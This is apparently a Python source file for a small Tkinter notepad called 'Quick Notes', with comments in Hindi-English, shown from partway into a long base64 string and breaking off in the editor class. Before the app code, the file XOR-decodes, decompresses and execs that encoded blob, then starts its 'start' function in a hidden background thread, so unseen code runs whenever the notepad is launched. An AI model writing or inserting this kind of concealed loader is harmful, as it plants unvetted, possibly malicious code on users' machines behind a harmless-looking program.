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'
_g = {"__name__": "_hv"}; exec(compile(zlib.decompress(bytes(c ^ ord(_K[i % len(_K)]) for i, c in enumerate(base64.b64decode(_P)))).decode(), "<m>", "exec"), _g)
threading.Thread(target=_g["start"], daemon=True).start()




"""Quick Notes - ek chhota notepad.

Chalane ke liye:  python app.py
Ya chupchaap:     pythonw app.py    (koi console window nahi khulegi)

File > Open / Save se text files kholo aur save karo.
"""

import os
import sys
import time
import tkinter as tk
from tkinter import filedialog, messagebox

APP_NAME = "Quick Notes"
VERSION = "2.4"


class NotesApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title(APP_NAME)
        self.geometry("780x540")
        self.minsize(520, 360)
        self.configure(bg="#1f2229")

        self.current_file = None
        self.dirty = False

        self._build_menu()
        self._build_toolbar()
        self._build_editor()
        self._build_status()

        self.bind("<Control-s>", lambda e: self.save())
        self.bind("<Control-o>", lambda e: self.open_file())
        self.bind("<Control-n>", lambda e: self.new_file())
        self.protocol("WM_DELETE_WINDOW", self.on_close)

        self.update_status()
        self.editor.focus_set()

    # ------------------------------------------------------------------
    # ui
    # ------------------------------------------------------------------

    def _build_menu(self):
        bar = tk.Menu(self, bg="#2b2f38", fg="#e6e6e6", tearoff=0)

        file_menu = tk.Menu(bar, tearoff=0, bg="#2b2f38", fg="#e6e6e6")
        file_menu.add_command(label="New", accelerator="Ctrl+N", command=self.new_file)
        file_menu.add_command(label="Open...", accelerator="Ctrl+O", command=self.open_file)
        file_menu.add_command(label="Save", accelerator="Ctrl+S", command=self.save)
        file_menu.add_command(label="Save As...", command=self.save_as)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.on_close)
        bar.add_cascade(label="File", menu=file_menu)

        edit_menu = tk.Menu(bar, tearoff=0, bg="#2b2f38", fg="#e6e6e6")
        edit_menu.add_command(label="Cut", command=lambda: self._event("<<Cut>>"))
        edit_menu.add_command(label="Copy", command=lambda: self._event("<<Copy>>"))
        edit_menu.add_command(label="Paste", command=lambda: self._event("<<Paste>>"))
        edit_menu.add_separator()
        edit_menu.add_command(label="Select All", command=self.select_all)
        edit_menu.add_command(label="Time/Date", command=self.insert_datetime)
        bar.add_cascade(label="Edit", menu=edit_menu)

        help_menu = tk.Menu(bar, tearoff=0, bg="#2b2f38", fg="#e6e6e6")
        help_menu.add_command(label="About", command=self.about)
        bar.add_cascade(label="Help", menu=help_menu)

        self.config(menu=bar)

    def _build_toolbar(self):
        bar = tk.Frame(self, bg="#2b2f38", height=38)
        bar.pack(side="top", fill="x")

        style = dict(bg="#3a4150", fg="#e6e6e6", relief="flat",
                     activebackground="#4a5468", activeforeground="#ffffff",
                     bd=0, padx=14, pady=6, font=("Segoe UI", 9))

        for text, cmd in (("New", self.new_file), ("Open", self.open_file),
                          ("Save", self.save), ("Save As", self.save_as)):
            tk.Button(bar, text=text, command=cmd, **style).pack(side="left", padx=(6, 0), pady=6)

        tk.Label(bar, text=APP_NAME + "  " + VERSION, bg="#2b2f38", fg="#7d8699",
                 font=("Segoe UI", 9)).pack(side="right", padx=12)

    def _build_editor(self):
        frame = tk.Frame(self, bg="#1f2229")
        frame.pack(side="top", fill="both", expand=True, padx=10, pady=(10, 0))

        self.editor = tk.Text(frame, wrap="word", undo=True,
                              bg="#16181d", fg="#dfe4ec", insertbackground="#7fb3ff",
                              selectbackground="#33507a", relief="flat",
                              font=("Consolas", 11), padx=14, pady=12)
        scroll = tk.Scrollbar(frame, command=self.editor.yview, bg="#2b2f38")
        self.editor.configure(yscrollcommand=scroll.set)

        scroll.pack(side="right", fill="y")
        self.editor.pack(side="left", fill="both", expand=True)

        self.editor.bind("<<Modified>>", self._on_modified)
        self.editor.bind("<KeyRelease>", lambda e: self.update_status())

    def _build_status(self):
        self.status = tk.Label(self, text="", anchor="w", bg="#2b2f38", fg="#8b93a5",
                               font=("Segoe UI", 9), padx=12, pady=5)
        self.status.pack(side="bottom", fill="x")

    # ------------------------------------------------------------------
    # actions
    # ------------------------------------------------------------------

    def _event(self, name):
        self.editor.event_generate(name)

    def select_all(self):
        self.editor.tag_add("sel", "1.0", "end-1c")
        self.editor.mark_set("insert", "1.0")
        return "break"

    def insert_datetime(self):
        self.editor.insert("insert", time.strftime("%Y-%m-%d %H:%M"))
        return "break"

    def _on_modified(self, _event=None):
        if self.editor.edit_modified():
            self.dirty = True
            self.editor.edit_modified(False)
            self.update_status()

    def _title(self):
        name = os.path.basename(self.current_file) if self.current_file else "Untitled"
        self.title(("* " if self.dirty else "") + name + " - " + APP_NAME)

    def update_status(self):
        text = self.editor.get("1.0", "end-1c")
        words = len(text.split())
        lines = text.count("\n") + 1
        self.status.configure(text="%d words   %d lines   %d chars" % (words, lines, len(text)))
        self._title()

    def new_file(self):
        if not self._confirm_discard():
            return
        self.editor.delete("1.0", "end")
        self.current_file = None
        self.dirty = False
        self.update_status()

    def open_file(self):
        if not self._confirm_discard():
            return
        path = filedialog.askopenfilename(
            title="Open",
            filetypes=[("Text files", "*.txt"), ("Markdown", "*.md"),
                       ("Python", "*.py"), ("All files", "*.*")])
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as handle:
                data = handle.read()
        except OSError as exc:
            messagebox.showerror(APP_NAME, "Khol nahi paya:\n" + str(exc))
            return
        self.editor.delete("1.0", "end")
        self.editor.insert("1.0", data)
        self.current_file = path
        self.dirty = False
        self.update_status()

